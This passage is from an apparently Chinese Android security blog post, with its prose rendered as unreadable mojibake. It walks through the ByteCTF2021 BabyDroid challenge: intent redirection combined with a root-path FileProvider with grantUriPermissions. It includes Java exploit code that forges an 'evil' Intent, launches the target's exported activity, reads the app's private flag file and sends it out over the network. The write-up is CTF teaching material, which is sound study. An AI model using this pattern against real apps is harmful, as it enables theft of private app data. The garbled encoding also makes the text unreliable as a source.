<p>å’Œ WEB æµ‹è¯•ç±»ä¼¼ï¼Œä¸»è¦æµ‹è¯•ç«™ç‚¹å­˜åœ¨çš„å¸¸è§çš„ web æ¼æ´</p>
<p>å¯æ‰‹å·¥æµ‹è¯•ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·æ‰«æã€æµ‹è¯•</p>
<h1>æ¼æ´çš„ä¸€äº›åˆ†æ ByteCTF2021</h1>
<p><a target="_blank" rel="noopener" href="https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg">https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/">https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/7/#%3Cstrong%3EHardDroid%3C%2Fstrong%3E">https://blog.wm-team.cn/index.php/archives/7/#&lt;strong&gt;HardDroid&lt;%2Fstrong&gt;</a></p>
<h2 id="BabyDroid">BabyDroid</h2>
<h3 id="è€ƒç‚¹ï¼š"><strong>è€ƒç‚¹</strong>ï¼š</h3>
<ul>
<li>Intenté‡å®šå‘</li>
<li>Grant Uri Permission é€šè¿‡fileproviderä»»æ„è¯»å†™</li>
</ul>
<p>å¯¹äº<code>é¢˜ç›®éƒ¨ç½²å’Œè¿è¡Œç¯å¢ƒ</code>æ²¡æœ‰å¤ªè¿‡ç ”ç©¶ï¼Œä¸»è¦æ˜¯å¯¹æ¼æ´åŠ æ·±ç†è§£ï¼Œå­¦ä¹ ä¸€ä¸‹æ€è·¯</p>
<h3 id="apkåˆ†æ">apkåˆ†æ</h3>
<p><strong>Manifest.xml</strong></p>
<p>å¯¹äºè¿™é“é¢˜çœ‹ä¸€ä¸‹Vulnerable.apkçš„æ¸…å•æ–‡ä»¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241009194758416.png" alt="image-20241009194758416"></p>
<p>ä¸»è¦æ˜¯ä¸Šé¢çº¢æ¡†å†…å®¹ï¼š2ä¸ªActivityï¼Œä¸€ä¸ªReceiverï¼Œä¸€ä¸ªproviderã€‚</p>
<p><strong>MainActivity</strong></p>
<p>ä¸»è¦å°±æ˜¯åŠ è½½å¸ƒå±€</p>
<p><strong>Vulnerable</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241009195133582.png" alt="image-20241009195133582"></p>
<p>è·å–ååºåˆ—åŒ– <code>key</code>å€¼ä¸º<code>intent</code>çš„æ•°æ®ï¼Œç„¶åå¯åŠ¨Intent</p>
<p><strong>FlagReceiver</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241009195413623.png" alt="image-20241009195413623"></p>
<p>åˆ›å»ºä¸€ä¸ª /data/data/Package_name/files/flagæ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠkeyå€¼ä¸ºflagè·å–çš„æ•°æ®å­˜æ”¾åœ¨åˆ›å»ºçš„è·¯å¾„æ–‡ä»¶ä¸‹ï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯flagå…³é”®ã€‚</p>
<p><strong>Provider</strong></p>
<p><code>FileProvider</code>æ˜¯<code>ContentProvider</code>çš„ä¸€ä¸ªå­ç±»ï¼Œä½¿ç”¨content://ä»£æ›¿file://ï¼Œä½¿å¾—å…±äº«æ•°æ®å®‰å…¨ã€‚</p>
<p>content URIå…è®¸ä¸´æ—¶æˆäºˆè¯¥æ–‡ä»¶è¯»å†™æƒé™ï¼Œåªéœ€è¦å½“åˆ›å»ºä¸€ä¸ªåŒ…å«è¯¥æ–‡ä»¶çš„content URIçš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡<code>Intent.setFlags()</code>æ·»åŠ ç›¸åº”çš„æƒé™ã€‚</p>
<p>å½“åˆ›å»ºFileProviderçš„æ—¶å€™ï¼Œéœ€è¦ä¸€ä¸ªxmlæ–‡ä»¶æŒ‡å®šè¯¥provideræä¾›çš„æ–‡ä»¶ï¼Œå¦‚<code>res/xml/file_paths.xml</code>ï¼Œå…¶ä¸­æä¾›äº†ç›¸åº”çš„æ˜ å°„è·¯å¾„å’Œåˆ«åï¼Œ</p>
<p>åŒæ—¶éœ€è¦åœ¨AndroidManifest.xmlä¸­çš„FileProviderå¯¹åº”çš„èŠ‚ç‚¹å†…å®šä¹‰<code> &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot; &gt;</code>æ¥å£°æ˜ã€‚ï¼ˆå…¶ä¸­resourceå±æ€§å†…ä¸ºæä¾›çš„xmlæ–‡ä»¶ï¼‰</p>
<p>è¯¥Vulnerable.apkæŒ‡å®šçš„xmlæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>&lt;root-path&gt;</code>èŠ‚ç‚¹ï¼šä»£è¡¨è®¾å¤‡çš„æ ¹ç›®å½•</p>
<ul>
<li>
<p><code>name</code>å±æ€§ï¼šç»™è¯¥ç›®å½•èµ·çš„åˆ«åï¼Œç”¨äºéšè—è·¯å¾„</p>
</li>
<li>
<p><code>path</code>å±æ€§ï¼šä¸´æ—¶æˆæƒè®¿é—®çš„è·¯å¾„ï¼ˆè¯¥ç›®å½•ä¸‹çš„å­ç›®å½•ï¼‰</p>
</li>
</ul>
<p>åˆ™è¯¥APKæä¾›çš„FileProvideræä¾›äº†æ ¹ç›®å½•ï¼Œé€šè¿‡<code>root/</code>åˆ«åæ¥è®¿é—®</p>
<p>åˆ™å¦‚æœæˆ‘ä»¬æƒ³è®¿é—®flagçš„å­˜å‚¨è·¯å¾„ï¼Œå®é™…æ„é€ çš„éƒ¨åˆ†uriåº”ä¸º<code>root/data/data/[package_name]/files/flag</code>ã€‚</p>
<h3 id="åˆ©ç”¨æ€è·¯">åˆ©ç”¨æ€è·¯</h3>
<p>ä¸»è¦å°±æ˜¯é€šè¿‡<code>FileProvider</code>è·å¾—è¿™ä¸ª<code>files/flag</code>æ–‡ä»¶çš„å†…å®¹ï¼Œä½†æ˜¯ä»–æ˜¯ä¸å¯å¯¼å‡ºçš„ï¼Œå‘ç°ä»–æœ‰ä¸€ä¸ª<code>grantUriPermissions=&quot;true&quot;</code>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªè®¿é—®content uriå†…å®¹ã€‚</p>
<p>åœ¨Attack.apkä¸­æ„é€ Intentè®¿é—®content uriå†…å®¹ï¼Œç„¶ååˆ©ç”¨Vnlnerable.classå¯åŠ¨è¿™ä¸ªintent</p>
<p>å…¶ä¸­æ„é€ çš„URLï¼š</p>
<p><code>content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</code></p>
<h3 id="Attackå®ç°">Attackå®ç°</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getFlag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦æ˜¯è¢«ç›®æ ‡apkæ¥startçš„è¯¥Activity</span></span><br><span class="line">    <span class="keyword">if</span> (getIntent().getAction().equals(<span class="string">&quot;evil&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// è·å–æ¥æ”¶åˆ°çš„uri</span></span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// å®šä¹‰ä¸€ä¸ªå­—ç¬¦è¾“å…¥æµ</span></span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(getContentResolver().openInputStream(data));</span><br><span class="line">            <span class="type">char</span>[] buf = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != isr.read(buf, <span class="number">0</span>, <span class="number">1024</span>)) &#123;</span><br><span class="line">                sb.append(String.valueOf(buf));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è¯»å–çš„å†…å®¹è¾“å…¥å­˜å‚¨åˆ°flag</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(sb);</span><br><span class="line">            Log.d(<span class="string">&quot;PwnPwn&quot;</span>, flag);</span><br><span class="line">            ((TextView) findViewById(R.id.tv_show)).setText(<span class="keyword">new</span> <span class="title class_">String</span>(sb));</span><br><span class="line">            <span class="comment">// é€šè¿‡ç½‘ç»œã€å°†ä¿¡æ¯ä¼ è¾“å›æ¥è·å–</span></span><br><span class="line">            sendData(<span class="string">&quot;getFlag&quot;</span>,flag);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ä¸€ä¸ªactionä¸º&quot;evil&quot;çš„Intent</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">// è®¾å®šç›®çš„ç»„ä»¶ä¸ºå½“å‰MainActivityï¼Œä¹Ÿå¯ä»¥å•ç‹¬æ”¾åœ¨å¦ä¸€ä¸ªAttackActivityä¸­</span></span><br><span class="line">        evil.setClassName(getPackageName(), MainActivity.class.getName());</span><br><span class="line">        <span class="comment">// è®¾ç½®æ“çºµdataæ•°æ®ä¸º flagæ‰€åœ¨æ–‡ä»¶çš„contentURI</span></span><br><span class="line">        evil.setData(Uri.parse(pwnUri));</span><br><span class="line">        <span class="comment">// æ·»åŠ è¯»å†™æƒé™</span></span><br><span class="line">        evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ–°å»ºä¸€ä¸ªintentï¼Œç”¨äºå¯åŠ¨ç›®æ ‡APK</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="comment">// å¯åŠ¨çš„ç›®æ ‡Activityä¸ºVulnerable</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">        <span class="comment">// åŒæ—¶å°†æ„é€ å¥½çš„evil Intentå½“ä½œ key &quot;intent&quot;çš„æ•°æ®åŒ…è£…è¿›å»</span></span><br><span class="line">        intent.putExtra(<span class="string">&quot;intent&quot;</span>, evil);</span><br><span class="line">        <span class="comment">// å¯åŠ¨ç›®æ ‡apk</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>Appå®‰å…¨åˆ†ææŒ‡å—</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://zxk1ng.github.io/posts/f416437f.html">https://zxk1ng.github.io/posts/f416437f.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>ä½œè€…</h><div class="post-copyright-cc-info"><h>zxk1ng</h></div></div><div class="post-copyright-c"><h>å‘å¸ƒäº</h><div class="post-copyright-cc-info"><h>2025-01-15</h></div></div><div class="post-copyright-u"><h>æ›´æ–°äº</h><div class="post-copyright-cc-info"><h>2025-01-15</h></div></div><div class="post-copyright-c"><h>è®¸å¯åè®®</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Android%E5%AE%89%E5%85%A8/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>Androidå®‰å…¨</a><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>å®‰å…¨æµ‹è¯•</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>æ¼æ´</a></div></div><link rel="stylesheet" href="/css/coin.css" media="defer" onload="this.media='all'"/><div class="post-reward"><button class="tip-button reward-button"><span class="tip-button__text">æŠ•å–‚ä½œè€…</span><div class="coin-wrapper"><div class="coin"><div class="coin__middle"></div><div class="coin__back"></div><div class="coin__front"></div></div></div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat_reward.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wechat_reward.jpg" alt="å¾®ä¿¡"/></a><div class="post-qr-code-desc">å¾®ä¿¡</div></li><li class="reward-item"><a href="/img/zfb_reward.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zfb_reward.jpg" alt="æ”¯ä»˜å®"/></a><div class="post-qr-code-desc">æ”¯ä»˜å®</div></li></ul></div></button></div><audio id="coinAudio" src="https://npm.elemecdn.com/akilar-candyassets@1.0.36/audio/aowu.m4a"></audio><script defer="defer" src="/js/coin.js"></script><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/e65d2ab6.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" onerror="onerror=null;src='/assets/r2.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">åˆ·æœºä¸è„±å£³æœºå…¥é—¨</div></div></a></div><div class="next-post pull-right"><a href="/posts/69766bbb.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://api.yimian.xyz/img?type=moe&amp;size=1920x1080" onerror="onerror=null;src='/assets/r2.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">ã€Šç¬¬ä¸€è¡Œä»£ç ã€‹é˜…è¯»ç¬”è®°</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><svg class="meta_icon" style="width:22px;height:22px;position:relative;top:5px"><use xlink:href="#icon-mulu1"></use></svg><span style="font-weight:bold">ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">APPå®‰å…¨åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#manifest%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B"><span class="toc-text">manifestæ–‡ä»¶æ£€æµ‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PermissionGroup%E6%A3%80%E6%B5%8B"><span class="toc-text">PermissionGroupæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest%E6%96%87%E4%BB%B6%E4%B8%AD%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E4%BD%BF%E7%94%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifestæ–‡ä»¶ä¸­ç³»ç»Ÿæƒé™ä½¿ç”¨æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest%E5%8D%B1%E9%99%A9ProtectionLevel%E6%9D%83%E9%99%90%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifestå±é™©ProtectionLevelæƒé™æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest-sharedUserId-%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifest sharedUserId æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest-allowBackup%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifest allowBackupæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndroidManifest-Debuggable%E6%A3%80%E6%B5%8B"><span class="toc-text">AndroidManifest Debuggableæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%BF%85%E8%A6%81%E6%9D%83%E9%99%90%E6%A3%80%E6%B5%8B"><span class="toc-text">éå¿…è¦æƒé™æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#app%E6%9C%80%E4%BD%8E%E7%89%88%E6%9C%AC%E6%A3%80%E6%9F%A5"><span class="toc-text">appæœ€ä½ç‰ˆæœ¬æ£€æŸ¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">ç»„ä»¶å®‰å…¨æ£€æµ‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Activity%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E6%A3%80%E6%B5%8B"><span class="toc-text">Activityç»„ä»¶å¯¼å‡ºæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#service%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E6%A3%80%E6%B5%8B"><span class="toc-text">serviceç»„ä»¶å¯¼å‡ºæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Receiver%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E6%A3%80%E6%B5%8B"><span class="toc-text">Receiverç»„ä»¶å¯¼å‡ºæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Provider%E7%BB%84%E4%BB%B6%E5%AF%BC%E5%87%BA%E6%A3%80%E6%B5%8B"><span class="toc-text">Providerç»„ä»¶å¯¼å‡ºæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContentProvider%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">ContentProviderç›®å½•éå†æ¼æ´æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Provider%EF%BC%9Agrant-uri-permission%E5%B1%9E%E6%80%A7%E6%A3%80%E6%B5%8B"><span class="toc-text">Providerï¼šgrant-uri-permissionå±æ€§æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intent-Based%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B"><span class="toc-text">Intent-Basedæ”»å‡»æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intent-Scheme-URL%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="toc-text">Intent Scheme URLæ¼æ´æ”»å‡»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E6%9C%AC%E5%9C%B0%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">åº”ç”¨æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#manifest%E4%B8%AD%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E4%B8%BA%E5%AE%9E%E7%8E%B0%E6%A3%80%E6%B5%8B"><span class="toc-text">manifestä¸­å®šä¹‰ç»„ä»¶ä¸ºå®ç°æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug%E6%88%96Test%E6%95%8F%E6%84%9F%E6%B5%8B%E8%AF%95%E7%BB%84%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%A3%80%E6%B5%8B"><span class="toc-text">Debugæˆ–Testæ•æ„Ÿæµ‹è¯•ç»„ä»¶æ³„éœ²æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intent%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8F%8D%E5%B0%84%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">Intentä¸å®‰å…¨åå°„é£é™©æ£€æµ‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebView%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-text">WebViewç»„ä»¶å®‰å…¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLite%E5%AE%89%E5%85%A8"><span class="toc-text">SQLiteå®‰å…¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8"><span class="toc-text">ç½‘ç»œé€šä¿¡å®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL%E8%BF%9E%E6%8E%A5%E6%A3%80%E6%B5%8B"><span class="toc-text">SSLè¿æ¥æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSL%E4%B8%8D%E5%AE%89%E5%85%A8%E7%BB%84%E4%BB%B6%E6%A3%80%E6%B5%8B"><span class="toc-text">SSLä¸å®‰å…¨ç»„ä»¶æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpHost%E6%A3%80%E6%B5%8B"><span class="toc-text">HttpHostæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpURLConnection%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">HttpURLConnectionæ¼æ´æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B"><span class="toc-text">ç½‘ç»œç«¯å£å¼€æ”¾å¨èƒæ£€æµ‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8A%A0%E5%AF%86%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">å¼±åŠ å¯†é£é™©æ£€æµ‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DES%E5%BC%B1%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">DESå¼±åŠ å¯†ç®—æ³•é£é™©æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E9%92%A5%E9%95%BF%E5%BA%A6%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">ä¸å®‰å…¨çš„å¯†é’¥é•¿åº¦é£é™©æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES-ECB%E5%BC%B1%E5%8A%A0%E5%AF%86%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">AES-ECBå¼±åŠ å¯†é£é™©æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IVParameterSpec%E4%B8%8D%E5%AE%89%E5%85%A8%E5%88%9D%E5%A7%8B%E5%8C%96%E5%90%91%E9%87%8F%E6%A3%80%E6%B5%8B"><span class="toc-text">IVParameterSpecä¸å®‰å…¨åˆå§‹åŒ–å‘é‡æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA%E4%B8%AD%E4%B8%8D%E4%BD%BF%E7%94%A8Padding%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">RSAä¸­ä¸ä½¿ç”¨Paddingé£é™©æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeyStore%E5%BC%B1%E5%AF%86%E7%A0%81%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">KeyStoreå¼±å¯†ç é£é™©æ£€æµ‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">æ•°æ®å®‰å…¨æ£€æµ‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%A3%80%E6%B5%8B"><span class="toc-text">æ•æ„Ÿä¿¡æ¯æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%AA%E8%B4%B4%E6%9D%BF%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">å‰ªè´´æ¿æ•æ„Ÿä¿¡æ¯æ³„éœ²é£é™©æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intent%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span 